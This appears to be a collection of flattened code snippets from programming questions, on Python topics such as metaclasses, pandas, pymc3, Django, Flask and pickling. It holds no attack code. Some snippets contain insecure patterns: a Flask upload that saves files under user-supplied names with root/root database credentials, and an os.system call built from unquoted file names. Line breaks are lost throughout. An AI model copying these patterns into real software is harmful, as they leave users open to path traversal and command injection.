"class ExampleClass ( object ) : def __getitem__ ( self , *args ) : return args def __call__ ( self , *args ) : return args def randomMethod ( self , *args ) : return argsa = ExampleClass ( ) # this worksprint a [ 3:7:2 , 1:11:2 ] # syntax error on the first colonprint a.randomMethod ( 3:7:2 , 1:11:2 ) print a ( 3:7:2 , 1:11:2 ) # these workprint a.randomMethod ( slice ( 3,7,2 ) , slice ( 1,11,2 ) ) print a ( slice ( 3,7,2 ) , slice ( 1,11,2 ) ) class ExampleClass2 ( object ) : def __getitem__ ( self , arg ) : return arg def __call__ ( self , arg ) : return argb = ExampleClass2 ( ) print b [ `` argument 1 '' , 2:4:6,3 ] # ( 'argument 1 ' , slice ( 2 , 4 , 6 ) , 3 ) print b ( slice ( 3,7,2 ) , slice ( 1,11,2 ) ) # TypeError : __call__ ( ) takes exactly 2 arguments ( 3 given )"
"def kernel_model ( filters=1 , kernel_size=3 ) : input_layer = Input ( shape= ( 250,1 ) ) conv_layer = Conv1D ( filters=filters , kernel_size=kernel_size , padding='same ' , use_bias = False ) ( input_layer ) model = Model ( inputs=input_layer , output=conv_layer ) return model"
"from types import SimpleNamespaceclass Metabox ( SimpleNamespace ) : def __getattr__ ( self , name ) : `` '' '' Create a new namespace for any non-existing attributes. `` '' '' print ( `` calling __getattr__ '' ) self.__dict__ [ name ] = Metabox ( ) return self.__dict__ [ name ]"
"from sympy import *z = symbols ( ' z ' ) eq1 = Eq ( z + 1 , 4 ) Eq ( eq1.lhs - 1 , eq1.rhs - 1 ) # Output : # z == 3"
class product_pricelist_inherit ( models.Model ) : _inherit = 'product.pricelist ' myfield= fields.Boolean ( string= '' Is this Pricelist Eligible for Me ? '' ) < odoo > < record id= '' product_product_pricelist_view '' model= '' ir.ui.view '' > < field name= '' model '' > product.pricelist < /field > < field name= '' inherit_id '' ref= '' product.product_pricelist_view '' / > < field name= '' arch '' type= '' xml '' > < field name= '' name '' position= '' after '' > < field name= '' myfield '' / > < /field > < /field > < /record > < /odoo >
"from tweepy import OAuthHandlerfrom tweepy import APIfrom datetime import datetime , time , timedeltaconsumer_key = `` consumer_secret = `` access_token = `` access_token_secret = `` account_screen_name = `` account_user_id = '897579556009332736'auth = OAuthHandler ( consumer_key , consumer_secret ) auth.set_access_token ( access_token , access_token_secret ) twitterApi = API ( auth ) mentions = twitterApi.mentions_timeline ( count=1 ) now = datetime.now ( ) for mention in mentions : if now < ( mention.created_at + timedelta ( hours=1 ) + timedelta ( seconds=10 ) ) : print `` there 's a mention in the last 10 seconds '' # do magic reply stuff here ! else : print `` do nothing , no recent tweets/the last mention was more than 10 seconds ago so it is n't new ''"
"import pymc3 as pmimport numpy as npimport theano.tensor as tn , m = train.shapedim = 10 # dimensionalitybeta_0 = 1 # scaling factor for lambdas ; unclear on its usealpha = 2 # fixed precision for likelihood functionstd = .05 # how much noise to use for model initialization # We will use separate priors for sigma and correlation matrix. # In order to convert the upper triangular correlation values to a # complete correlation matrix , we need to construct an index matrix : n_elem = dim * ( dim - 1 ) / 2tri_index = np.zeros ( [ dim , dim ] , dtype=int ) tri_index [ np.triu_indices ( dim , k=1 ) ] = np.arange ( n_elem ) tri_index [ np.triu_indices ( dim , k=1 ) [ : :-1 ] ] = np.arange ( n_elem ) logging.info ( 'building the BPMF model ' ) with pm.Model ( ) as bpmf : # Specify user feature matrix sigma_u = pm.Uniform ( 'sigma_u ' , shape=dim ) corr_triangle_u = pm.LKJCorr ( 'corr_u ' , n=1 , p=dim , testval=np.random.randn ( n_elem ) * std ) corr_matrix_u = corr_triangle_u [ tri_index ] corr_matrix_u = t.fill_diagonal ( corr_matrix_u , 1 ) cov_matrix_u = t.diag ( sigma_u ) .dot ( corr_matrix_u.dot ( t.diag ( sigma_u ) ) ) lambda_u = t.nlinalg.matrix_inverse ( cov_matrix_u ) mu_u = pm.Normal ( 'mu_u ' , mu=0 , tau=beta_0 * lambda_u , shape=dim , testval=np.random.randn ( dim ) * std ) U = pm.MvNormal ( ' U ' , mu=mu_u , tau=lambda_u , shape= ( n , dim ) , testval=np.random.randn ( n , dim ) * std ) # Specify item feature matrix sigma_v = pm.Uniform ( 'sigma_v ' , shape=dim ) corr_triangle_v = pm.LKJCorr ( 'corr_v ' , n=1 , p=dim , testval=np.random.randn ( n_elem ) * std ) corr_matrix_v = corr_triangle_v [ tri_index ] corr_matrix_v = t.fill_diagonal ( corr_matrix_v , 1 ) cov_matrix_v = t.diag ( sigma_v ) .dot ( corr_matrix_v.dot ( t.diag ( sigma_v ) ) ) lambda_v = t.nlinalg.matrix_inverse ( cov_matrix_v ) mu_v = pm.Normal ( 'mu_v ' , mu=0 , tau=beta_0 * lambda_v , shape=dim , testval=np.random.randn ( dim ) * std ) V = pm.MvNormal ( ' V ' , mu=mu_v , tau=lambda_v , testval=np.random.randn ( m , dim ) * std ) # Specify rating likelihood function R = pm.Normal ( ' R ' , mu=t.dot ( U , V.T ) , tau=alpha * np.ones ( ( n , m ) ) , observed=train ) # ` start ` is the start dictionary obtained from running find_MAP for PMF. # See the previous post for PMF code.for key in bpmf.test_point : if key not in start : start [ key ] = bpmf.test_point [ key ] with bpmf : step = pm.NUTS ( scaling=start ) PositiveDefiniteError : Scaling is not positive definite . Simple check failed . Diagonal contains negatives . Check indexes [ 0 1 2 3 ... 1030 1031 1032 1033 1034 ]"
try : # do something exception-proneexcept FooException as e : if e.message == 'Something I want to handle ' : # handle the exception else : raise e
apt-get install python-setuptools python-numpy python-qt4 python-scipy python-mysqldb python-lxmleasy_install -U ete2
"class Foobar ( object ) : pass [ '__class__ ' , '__delattr__ ' , '__dict__ ' , '__doc__ ' , '__format__ ' , '__getattribute__ ' , '__hash__ ' , '__init__ ' , '__module__ ' , '__new__ ' , '__reduce__ ' , '__reduce_ex__ ' , '__repr__ ' , '__setattr__ ' , '__sizeof__ ' , '__str__ ' , '__subclasshook__ ' , '__weakref__ ' ] Foobar.__name__"
Process user | Process system | OS system % | OS idle % 19.9 | 10.5 | 6 | 74 5.6 | 2.3 | 4 | 876.8 | 1.7 | 11 | 754.6 | 5.5 | 43 | 520.5 | 26.4 | 4 | 90
"import osfrom flask import Flask , request , render_templatefrom flaskext.mysql import MySQLmysql=MySQL ( ) app=Flask ( __name__ ) app.config [ 'MYSQL_DATABASE_USER ' ] = 'root'app.config [ 'MYSQL_DATABASE_PASSWORD ' ] = 'root'app.config [ 'MYSQL_DATABASE_DB ' ] = 'matrimony'app.config [ 'MYSQL_DATABASE_HOST ' ] = 'localhost'mysql.init_app ( app ) APP_ROOT=os.path.dirname ( os.path.abspath ( __file__ ) ) @ app.route ( '/ ' , methods= [ 'GET ' , 'POST ' ] ) def get_data ( ) : if request.method=='POST ' : print ( `` hlo '' ) candidate_name=request.form [ 'cname ' ] file=request.files [ 'canpic ' ] conn = mysql.connect ( ) target = os.path.join ( APP_ROOT , 'file ' ) if not os.path.isdir ( target ) : os.makedirs ( target ) print ( target ) filename = file.filename destination = `` / '' .join ( [ target , filename ] ) print ( destination ) file.save ( destination ) print `` saved '' datafile = open ( destination , `` rb '' ) print `` file opend '' d = open ( `` F : /five pro/testvote/test.jpg '' , `` wb '' ) print `` file test opnend '' thedata = datafile.read ( ) print `` file readed '' d.write ( thedata ) d.close ( ) datafile.close ( ) b1 = open ( `` F : /five pro/testvote/test.jpg '' , 'rb ' ) .read ( ) target1 = os.path.join ( APP_ROOT , 'file ' ) conn = mysql.connect ( ) cursor = conn.cursor ( ) print ( `` yoyo '' ) cursor.execute ( `` insert into Votetable2 values ( % s , % s ) '' , ( candidate_name , b1 ) ) print `` execuet '' conn.commit ( ) return render_template ( 'final_pic.html ' ) if __name__=='__main__ ' : app.run ( debug=True ) < ! DOCTYPE html > < html > < body > < form method= '' POST '' action= '' / '' enctype= '' multipart/form-data '' > Candidate Name : < input type= '' text '' name= '' cname '' > < br > Candidate Image < input type= '' file '' name= '' canpic '' accept= '' image/* '' > < br > < input type= '' submit '' value= '' Submit '' > < /form > < /body > < /html > < ! DOCTYPE html > < html lang= '' en '' > < body > < form > < table border= '' 2 '' > < tr > < td > CANDIDATE NAME < /td > < td > CANDIDATE IMAGE < /td > < /tr > { % for row in a % } < tr > < td > { { row [ 0 ] } } < input type= '' submit '' value= '' Done '' > < /td > < td > { { row [ 1 ] } } < /tr > { % endfor % } < /table > < /form > < /body > < /html >"
"class Foo : def foo_method ( self , other_foo : Foo ) : return `` Hello World ! ''"
class Story ( models.Model ) : image = FilerImageField ( ) class Gift ( models.Model ) : # some stuffclass GiftImage ( models.Model ) : gift = models.ForeignKey ( Gift ) image = FilerImageField ( ) image = FilerImageField ( upload_to='somewhere ' ) # How a django ImageField would do itimage = FilerImageField ( folder='somewhere ' ) # a guessimage = FilerImageField ( name='somewhere ' ) # a guessimage = FilerImageField ( folder_name='somewhere ' ) # another guess
"class Hal ( object ) : def __getattr__ ( self , name ) : print ' I don\'t have a % s function ' % name names = dir ( self ) # < -- infinite recursion happens here print 'My functions are : % s ' % ' , '.join ( names ) exit ( ) def close_door ( self ) : passx = Hal ( ) x.open_door ( ) I do n't have a open_door functionMy functions are : close_door , __getattr__ , __init__ , __doc__ , ..."
"a = [ 0 , 5 , 1 ] b = [ 1 , 2 , 1 ] [ 0 , 5 , 5 , 1 ]"
"cdef class Foo ( object ) : cdef int n def __init__ ( self , n ) : self.n = n def __reduce__ ( self ) : return Foo , ( self.n , ) from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Distutils import build_extsetup ( cmdclass = { 'build_ext ' : build_ext } , ext_modules = [ Extension ( `` reduce '' , [ `` reduce.pyx '' ] ) ] ) import reduceimport picklef = reduce.Foo ( 4 ) print pickle.dumps ( f ) mkdir barmv reduce.so barecho `` from reduce import Foo '' > bar/__init__.py import barimport picklef = bar.Foo ( 4 ) print pickle.dumps ( f ) File `` /usr/lib/python2.7/pickle.py '' , line 286 , in save f ( self , obj ) # Call unbound method with explicit selfFile `` /usr/lib/python2.7/pickle.py '' , line 748 , in save_global ( obj , module , name ) ) pickle.PicklingError : Ca n't pickle < type 'reduce.Foo ' > : it 's not found as reduce.Foo ImportError : No module named reduce f = bar.Foo ( 4 ) call , args = f.__reduce__ ( ) print call ( *args )"
"joined_df = pd.merge ( df1 , df2 , how='left ' , on= [ 'name ' , 'city ' ] ) joined_df = pd.merge ( df1 , df2 , how='left ' , on= [ 'name ' , 'city ' , 'df1.year ' > = 'df2.year_min ' ] ) SELECT * FROM df1JOIN df2 on ( df1.name = df2.name and df1.year = df2.year and df1.year > df2.year_min )"
"from numpy import *import pylab as plimport numpy as npimport scipy as scipyfrom scipy import optimize # Get datafn = '4K_peak_hiresGhz.txt'F_values , S_values , P_values = loadtxt ( fn , unpack=True , usecols= [ 1 , 2 , 3 ] ) # Select Frequency range of peaklower = 4.995upper = 5.002F_values_2 = F_values [ ( F_values > lower ) & ( F_values < upper ) ] S_values_2 = S_values [ ( F_values > lower ) & ( F_values < upper ) ] P_values_2 = P_values [ ( F_values > lower ) & ( F_values < upper ) ] # Calculate Q-value of selected peakS_Peak = max ( S_values_2 ) print ( 'S21 peak ( dB ) : ' ) print ( S_Peak ) printF_Peak = F_values_2 [ S_values_2.argmax ( ) ] print ( 'Freq at S21 peak ( GHz ) ' ) print ( F_Peak ) printwidth_S = S_Peak - 3print ( 'S21 peak - 3dB ( dB ) ' ) print ( width_S ) printf , axarr = pl.subplots ( 2 , sharex=False ) axarr [ 0 ] .set_xlabel ( 'Frequency ( GHz ) ' ) axarr [ 0 ] .plot ( F_values_2 , S_values_2 ) axarr [ 0 ] .plot ( F_values_2 , S_values_2 , ' . ' ) axarr [ 0 ] .set_ylabel ( 'S21 ( dB ) ' ) axarr [ 0 ] .axhline ( y=width_S , linewidth= ' 0.7 ' , ls='dashed ' , color='red ' ) axarr [ 0 ] .axhline ( y=S_Peak , linewidth= ' 1 ' , ls='dashed ' , color='black ' ) axarr [ 0 ] .axvline ( x=F_Peak , linewidth= ' 1 ' , ls='dashed ' , color='black ' ) axarr [ 1 ] .scatter ( F_values_2 , P_values_2 ) axarr [ 1 ] .set_ylabel ( 'Phase ( deg ) ' ) axarr [ 1 ] .set_xlabel ( 'Frequency ( GHz ) ' ) pl.show ( )"
"import cPickleimport osqas1 = [ ( 'Are you more like Waffle or a Pancake ' ) , ( ' 1 . Waffle ' , 1 , 0 ) , ( ' 2 . Pancake ' , 0 , 1 ) ] qas2 = [ ( 'Do you have a straight edge ? ' ) , ( ' 1 . Yes ' , 1 , 0 ) , ( ' 2 . No ' , 0 , 1 ) ] qas3 = [ ( 'Are you simliar in shape to a lolipop ? ' ) , ( ' 1 . Yes ' , 0 , 1 ) , ( ' 2 . No ' , 1 , 0 ) ] qas4 = [ ( 'Is the world rounded like a planet , or flat like a map ? ' ) , ( ' 1 . Rounded ' , 0 , 1 ) , ( `` 2 . Flat '' , 1 , 0 ) ] def hasFile ( ) : print ' I see the file ' qas_file = open ( 'qas.dat ' , ' r ' ) qas1 = cPickle.load ( qas_file ) qas2 = cPickle.load ( qas_file ) qas3 = cPickle.load ( qas_file ) qas4 = cPickle.load ( qas_file ) qas_file.close confirmer ( ) def noFile ( ) : print ' I dont see a file ... ' saver ( ) def confirmer ( ) : print qas1 print qas2 print qas3 print qas4def saver ( ) : qas_file = open ( 'qas.dat ' , ' w ' ) print 'No worries , creating one now ' cPickle.dump ( qas1 , qas_file ) cPickle.dump ( qas2 , qas_file ) cPickle.dump ( qas3 , qas_file ) cPickle.dump ( qas4 , qas_file ) qas_file.close print 'all done'fname = `` qas.dat '' if os.path.isfile ( fname ) : hasFile ( ) else : noFile ( ) import cPickle # CounterscounterCircle = 0counterSquare = 0 # tuplesdef hasFile ( ) : print ' I see the file ' qas_file = open ( 'qas.dat ' , ' r ' ) qas1 = cPickle.load ( qas_file ) qas2 = cPickle.load ( qas_file ) qas3 = cPickle.load ( qas_file ) qas4 = cPickle.load ( qas_file ) qas_file.close # varibles Im made to assignmessageDisplayed = 0question = 'beer ' # prints to screen def showQaA ( ) : print question [ 0 ] print question [ 1 ] [ 0 ] print question [ 2 ] [ 0 ] # recieves and implements responsesdef getResponce ( ) : global counterCircle global counterSquare global qas1 , qas2 , qas3 , qas4 ansew = raw_input ( ' > > ' ) if ansew == `` 1 '' : counterSquare = counterSquare + question [ 1 ] [ 1 ] # ( +1 ) counterCircle = counterCircle + question [ 1 ] [ 2 ] # ( +0 ) elif ansew == `` 2 '' : counterSquare = counterSquare + question [ 2 ] [ 1 ] # ( +0 ) counterCircle = counterCircle + question [ 2 ] [ 2 ] # ( +1 ) print counterCircle print counterSquare # Gets the current tuple infomation to display ( Will be more advanced ) def getQuestion ( ) : global question if messageDisplayed == 0 : question = qas1 elif messageDisplayed == 1 : question = qas2 elif messageDisplayed == 2 : question = qas3 elif messageDisplayed == 3 : question = qas4 else : print 'youre screwd ' # figures out and prints resultsdef results ( ) : print `` This is the circle results '' , counterCircle print `` This is the square results '' , counterSquare if counterSquare < counterCircle : print `` You are a circle ! '' elif counterSquare > counterCircle : print `` You are a square ! '' else : print `` You are the elusive squircle ! `` # mainLoop currently set to 4 questionshasFile ( ) while messageDisplayed < =3 : getQuestion ( ) showQaA ( ) getResponce ( ) messageDisplayed +=1results ( )"
"t = ( ( 1 , 'one ' ) , ( 2 , 'two ' ) ) ( ( 1 , 2 ) , ( 'one ' , 'two ' ) ) digits = tuple ( digit for digit , word in t ) words = tuple ( word for digit , word in t ) rearranged = tuple ( digits , words )"
"N = 5M = 2A = np.zeros ( ( M , N ) ) B = np.random.randint ( M , size=N ) # contains indices for AC = np.random.rand ( N , N )"
"while playlist : player = subprocess.Popen ( [ `` avconv '' , `` -i '' , `` Music/ % s '' % playlist [ 0 ] , `` -f '' , `` s16le '' , `` -ar '' , `` 22.05k '' , `` -ac '' , `` 1 '' , `` - '' ] , stdout=subprocess.PIPE ) radio = subprocess.Popen ( [ `` ./pifm '' , `` - '' , freq ] , stdin=player.stdout ) radio.wait ( ) print `` ************ exiting from radio : ) '' player.wait ( ) print `` ************ exiting from player : ) '' playlist.pop ( 0 ) player = Noneradio = None print `` ************ stop requested '' if radio and radio.poll ( ) is None : print `` ************ terminating radio : ) '' radio.terminate ( ) if player and player.poll ( ) is None : print `` ************ terminating player : ) '' player.terminate ( ) def start_radio ( ) : global radio radio = subprocess.Popen ( [ `` ./pifm '' ... ] , stdin=subprocess.PIPE ) def play ( ) : global player while playlist and radio : player = subprocess.Popen ( [ `` avconv '' ... ] , stdout=radio.stdin ) player.wait ( ) playlist.pop ( 0 ) def stop ( ) : if player and player.poll ( ) is None : print `` ************ terminating player : ) '' player.terminate ( )"
"> > > aarray ( [ 1 , 2 , 3 ] ) > > > barray ( [ [ 1 , 2 ] , [ 4 , 5 ] , [ 7 , 8 ] ] ) > > > # result > > > carray ( [ [ 1 , 2 ] , [ 8 , 10 ] , [ 21 , 24 ] ] ) > > >"
"S = ' ( A or B ) and not ( A and C ) ' A = { 0 , 1 } B = { 0 , 2 } C = { 1 , 3 } ( A or B ) = { 0 , 1 , 2 } ( A & C ) = { 1 } not ( A & C ) = { 0 , 2 , 3 } S = { 0,2 }"
"LOCATION1 Motion Plan is like so,5 63 41 2Initial positon is ( x1 , y1 ) This gets coded as ( x1 , y1 ) - > ( x1+dx , y1 ) - > ( x1 , y1+dy ) - > ( x1+dx , y1+dy ) ... and so onLOCATION2 Motion Plan is like so,5 3 16 4 2The initial position is ( x1 , y1 ) This gets coded as ( x1 , y1 ) - > ( x1 , y1-dy ) - > ( x1-dx , y1 ) - > ( x1-dx , y1-dy ) ... and so onLOCATION3 Motion Plan is like so,6 54 32 1Initial positon is ( x1 , y1 ) This gets coded as ( x1 , y1 ) - > ( x1-dx , y1 ) - > ( x1 , y1+dy ) - > ( x1-dx , y1+dy ) ... and so onLOCATION4 Motion Plan is like so,6 4 25 3 1The initial position is ( x1 , y1 ) This gets coded as ( x1 , y1 ) - > ( x1 , y1+dy ) - > ( x1-dx , y1 ) - > ( x1-dx , y1+dy ) ... and so on"
"def monkeypatch_class ( name , bases , namespace ) : `` 'Guido 's monkeypatch metaclass . ' '' assert len ( bases ) == 1 , `` Exactly one base class required '' base = bases [ 0 ] for name , value in namespace.iteritems ( ) : if name ! = `` __metaclass__ '' : setattr ( base , name , value ) return base from swiftclient import clientimport StringIOimport utilsclass Connection ( client.Connection ) : __metaclass__ = monkeypatch_class def get_object ( self , path , obj , resp_chunk_size=None , ... ) : contents = None headers = { } # retrieve content from path and store it in 'contents ' ... if resp_chunk_size is not None : # stream the string into chunks def _object_body ( ) : stream = StringIO.StringIO ( contents ) buf = stream.read ( resp_chunk_size ) while buf : yield buf buf = stream.read ( resp_chunk_size ) contents = _object_body ( ) return headers , contents class SwiftStorage ( Storage ) : def get_content ( self , path , chunk_size=None ) : path = self._init_path ( path ) try : _ , obj = self._connection.get_object ( self._container , path , resp_chunk_size=chunk_size ) return obj except Exception : raise IOError ( `` Could not get content : { } '' .format ( path ) ) def stream_read ( self , path ) : try : return self.get_content ( path , chunk_size=self.buffer_size ) except Exception : raise OSError ( `` Could not read content from stream : { } '' .format ( path ) ) def test_stream ( self ) : filename = self.gen_random_string ( ) # test 7MB content = self.gen_random_string ( 7 * 1024 * 1024 ) self._storage.stream_write ( filename , io ) io.close ( ) # test read / write data = `` for buf in self._storage.stream_read ( filename ) : data += buf self.assertEqual ( content , data , `` stream read failed . output : { } '' .format ( data ) ) ======================================================================FAIL : test_stream ( test_swift_storage.TestSwiftStorage ) -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Traceback ( most recent call last ) : File `` /home/bacongobbler/git/github.com/bacongobbler/docker-registry/test/test_local_storage.py '' , line 46 , in test_stream `` stream read failed . output : { } '' .format ( data ) ) AssertionError : stream read failed . output : < generator object _object_body at 0x2a6bd20 > def gen_num ( ) : def _object_body ( ) : for i in range ( 10000000 ) : yield i return _object_body ( ) def get_num ( ) : return gen_num ( ) def stream_read ( ) : return get_num ( ) def main ( ) : num = 0 for i in stream_read ( ) : num += i print numif __name__ == '__main__ ' : main ( )"
"os.chdir ( path ) f = open ( file , '' r '' ) lines = f.readlines ( ) print `` without assignment `` + str ( len ( f.readlines ( ) ) ) print `` with assignment `` + str ( len ( lines ) ) without assignment 0with assigment 1268"
"def decorateAll ( decorator ) : class MetaClassDecorator ( type ) : def __new__ ( meta , classname , supers , classdict ) : for name , elem in classdict.items ( ) : if type ( elem ) is FunctionType : classdict [ name ] = decorator ( classdict [ name ] ) return type.__new__ ( meta , classname , supers , classdict ) return MetaClassDecorator class Account ( object , metaclass=decorateAll ( Counter ) ) : def __init__ ( self , initial_amount ) : self.amount = initial_amount def withdraw ( self , towithdraw ) : self.amount -= towithdraw def deposit ( self , todeposit ) : self.amount += todeposit def balance ( self ) : return self.amount def Counter ( fun ) : fun.count = 0 def wrapper ( *args ) : fun.count += 1 print ( `` { 0 } Executed { 1 } times '' .format ( fun.__name__ , fun.count ) ) return fun ( *args ) return wrapper class Counter ( ) : def __init__ ( self , fun ) : self.fun = fun self.count = 0 def __call__ ( self , *args , **kwargs ) : print ( `` args : '' , self , *args , **kwargs ) self.count += 1 print ( `` { 0 } Executed { 1 } times '' .format ( self.fun.__name__ , self.count ) ) return self.fun ( *args , **kwargs ) line 32 , in __call__return self.fun ( *args , **kwargs ) TypeError : __init__ ( ) missing 1 required positional argument : 'initial_amount '"
class Publisher ( models.Model ) : name = models.CharField ( max_length=30 ) class Book ( models.Model ) : title = models.CharField ( max_length=100 ) publisher = models.ForeignKey ( Publisher ) publisher = Publisher.objects.prefetch_related ( 'book_set ' ) .filter ( pk=id ) .first ( ) for book in publisher.book_set.all ( ) : foo ( )
mapreduce : - name : JobName mapper : input_reader : google.appengine.ext.mapreduce.input_readers.DatastoreInputReader handler : handler_name params : - name : entity_kind default : KindName
for filepath in sys.stdin : dir = os.path.basename ( filepath ) ... IPython.embed ( ) find . -type f | thescript.py
"Traceback ( most recent call last ) : File `` retry/example.py '' , line 46 , in < module > response_stream = message_stream.flat_map ( functools.partial ( message_handler , context=context ) ) File `` /home/justin/virtualenv/retry/local/lib/python2.7/site-packages/rx/linq/observable/selectmany.py '' , line 67 , in select_many selector = adapt_call ( selector ) File `` /home/justin/virtualenv/retry/local/lib/python2.7/site-packages/rx/internal/utils.py '' , line 37 , in adapt_call_1 argnames , varargs , kwargs = getargspec ( func ) [ :3 ] File `` /usr/lib/python2.7/inspect.py '' , line 816 , in getargspec raise TypeError ( ' { ! r } is not a Python function'.format ( func ) ) TypeError : < method-wrapper '__call__ ' of functools.partial object at 0x2ce6cb0 > is not a Python function from __future__ import absolute_importfrom rx import Observable , Observerfrom pykafka import KafkaClientfrom pykafka.common import OffsetTypeimport loggingimport requestsimport functoolslogger = logging.basicConfig ( ) def puts ( thing ) : print thingdef message_stream ( consumer ) : def thing ( observer ) : for message in consumer : observer.on_next ( message ) return Observable.create ( thing ) def message_handler ( message , context=None ) : def req ( ) : return requests.get ( 'http : //httpbin.org/get ' ) return Observable.start ( req ) def handle_response ( message , response , context=None ) : consumer = context [ 'consumer ' ] producer = context [ 'producer ' ] t = 'even ' if message % 2 == 0 else 'odd ' return str ( message ) + ' : ' + str ( response ) + ' - ' + t + ' | ' + str ( consumer ) + ' | ' + producerconsumer = [ 'pretend ' , 'these ' , 'are ' , 'kafka ' , 'messages ' ] producer = 'some producer'context = { 'consumer ' : consumer , 'producer ' : producer } message_stream = message_stream ( consumer ) response_stream = message_stream.flat_map ( functools.partial ( message_handler , context=context ) ) message_response_stream = message_stream.zip ( response_stream , functools.partial ( handle_response , context=context ) ) message_stream.subscribe ( puts )"
"df [ ' a ' ] .str.len ( ) df [ [ ' a ' , ' b ' , ' c ' ] ] .str.len ( ) .min"
"import mmapimport ctypesfilename = `` test '' with open ( filename , 'rb+ ' ) as fd : buf = mmap.mmap ( fd.fileno ( ) , 0 ) int_pointer = ctypes.c_int.from_buffer ( buf ) with open ( filename , 'rb ' ) as fd : test_mmap_ro = mmap.mmap ( fd.fileno ( ) , 0 , access=mmap.ACCESS_READ , ) int_pointer2 = ctypes.c_int.from_buffer ( test_mmap_ro ) # fails here TypeError : must be read-write buffer , not mmap.mmap TypeError : mmap ca n't modify a readonly memory map ."
"class BaseIndex ( indexes.SearchIndex , indexes.Indexable ) : text = indexes.CharField ( document=True , use_template=True ) object_id = indexes.IntegerField ( ) timestamp = indexes.DateTimeField ( ) class Meta : abstract = Trueclass PersonIndex ( BaseIndex ) : ... other fields ... NotImplementedError : You must provide a 'model ' method for the ' < myapp.search_indexes.BaseIndex object at 0x18a7328 > ' index . class BaseIndex ( object ) : text = indexes.CharField ( document=True , use_template=True ) object_id = indexes.IntegerField ( ) timestamp = indexes.DateTimeField ( ) class PersonIndex ( BaseIndex , indexes.SearchIndex , indexes.Indexable ) : first_name = indexes.CharField ( ) middle_name = indexes.CharField ( ) last_name = indexes.CharField ( ) SearchFieldError : The index 'PersonIndex ' must have one ( and only one ) SearchField with document=True ."
"[ 1,1,1,0,0,1,1,1,1,0,0,1,0,0,0,1,1,1,0,1,1,1,1 ] [ 0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1 ] import numpy as npimport pandas as pdimport scipy # from scipy import ndimagedf= pd.DataFrame ( { ' x ' : np.array ( [ 1,1,1,0,0,1,1,1,1,0,0,1,0,0,0,1,1,1,0,1,1,1,1 ] ) } ) df_alt = df.copy ( ) def filter_df ( df , colname , window_size ) : rolling_func = lambda z : z.sum ( ) > = window_size df [ colname ] = pd.rolling_apply ( df [ colname ] , window_size , rolling_func , min_periods=window_size/2 , center = True ) def filter_alt ( df , colname , window_size ) : rolling_func = lambda z : z.sum ( ) > = window_size return scipy.ndimage.filters.generic_filter ( df [ colname ] .values , rolling_func , size = window_size , origin = 0 ) window_size = 4filter_df ( df , ' x ' , window_size ) print dffilter_alt ( df_alt , ' x ' , window_size )"
"import osimport sysfor roots , dirlist , filelist in os.walk ( os.curdir ) : for file in [ os.path.join ( roots , filegot ) for filegot in filelist ] : if `` bz2 '' not in file : print `` Compressing % s '' % ( file ) os.system ( `` bzip2 % s '' % file ) print `` : DONE ''"
"for module in config : for testcase in config [ module ] : data = config [ dict.keys ( config ) [ 0 ] ] [ testcase ] [ 'foo ' ] test_foo ( self , data )"
"def foo ( x ) : return foo ( x - 1 ) if x > 0 else 1def wrap ( f ) : def wrapped ( *args , **kwargs ) : print `` f was called '' return f ( *args , **kwargs ) return wrapped"
/project __init__.py main.py /__helpers __init__.py helpers.py ... # /project/__helpers/helpers.pyclass HelperException ( Exception ) : passdef some_function_that_raises ( ) : raise HelperException # /projects/main.pyfrom project.__helpers.helpers import some_function_that_raisesclass MainException ( Exception ) : pass
"> type LFT = ( Integer , Integer , Integer , Integer ) > > extr : : LFT - > Integer - > Rational > extr ( q , r , s , t ) x = ( ( fromInteger q ) * x + ( fromInteger r ) ) / ( ( fromInteger s ) * x + ( fromInteger t ) ) > > unit : : LFT > unit = ( 1,0,0,1 ) > > comp : : LFT - > LFT - > LFT > comp ( q , r , s , t ) ( u , v , w , x ) = ( q*u+r*w , q*v+r*x , s*u+t*w , s*v+t*x ) > pi = stream next safe prod cons init lfts where > init = unit > lfts = [ ( k , 4*k+2 , 0 , 2*k+1 ) | k < - [ 1.. ] ] > next z = floor ( extr z 3 ) > safe z n = ( n == floor ( extr z 4 ) ) > prod z n = comp ( 10 , -10*n , 0 , 1 ) z > cons z z ’ = comp z z ’"
"import typingdef test_ordered_dict ( od : typing.Dict [ str , int ] ) - > typing.Dict [ str , int ] : return 1 # type error 1a = test_ordered_dict ( 1 ) # type error 2def test_me ( ) : a = test_ordered_dict ( 1 ) # type error 3 is not reported"
"def some_decorator ( func ) : if the_magic_happens_here ( func ) : # < -- -- Point of interest print 'Yay , found a method ^_^ ( unbound jet ) ' else : print 'Meh , just an ordinary function : / ' return funcclass MyClass ( object ) : @ some_decorator def method ( self ) : pass @ some_decoratordef function ( ) : pass"
"array ( [ [ 32 , 32 , 99 , 9 , 45 ] , # A [ 99 , 45 , 9 , 45 , 32 ] , [ 45 , 45 , 99 , 99 , 32 ] , [ 9 , 9 , 32 , 45 , 99 ] ] ) array ( [ 99 , 32 , 45 , 9 ] ) # B array ( [ [ 1 , 1 , 0 , 3 , 2 ] , [ 0 , 2 , 3 , 2 , 1 ] , [ 2 , 2 , 0 , 0 , 1 ] , [ 3 , 3 , 1 , 2 , 0 ] ] )"
"def parse_og ( self , data ) : `` '' '' lxml parsing to the bone ! `` '' '' try : tree = etree.HTML ( data ) # < < break occurs on this line > > m = tree.xpath ( `` //meta [ @ property ] '' ) # for i in m : # y = i.attrib [ 'property ' ] # x = i.attrib [ 'content ' ] # # self.rj [ y ] = x # commented out in this example because code fails anyway tree = `` m = `` x = `` y = `` i = `` del tree del m del x del y del i except Exception : print 'lxml error : ' , sys.exc_info ( ) [ 1:3 ] print len ( data ) pass"
[ [ 0 . 0 . ] [ 12.54901961 18.03921569 ] [ 13.7254902 17.64705882 ] [ 14.11764706 17.25490196 ] [ 14.90196078 17.25490196 ] [ 14.50980392 17.64705882 ] [ 14.11764706 17.64705882 ] [ 14.50980392 17.25490196 ] [ 17.64705882 18.03921569 ] [ 21.17647059 34.11764706 ] ] [ 18.03921569 17.64705882 17.25490196 17.25490196 17.64705882 17.64705882 17.25490196 17.64705882 21.17647059 22.35294118 ]
"import matplotlib.pyplot as pltfig , ax = plt.subplots ( ) ax.plot ( [ 1 , 2 , 3 ] ) ax2 = ax.twinx ( )"
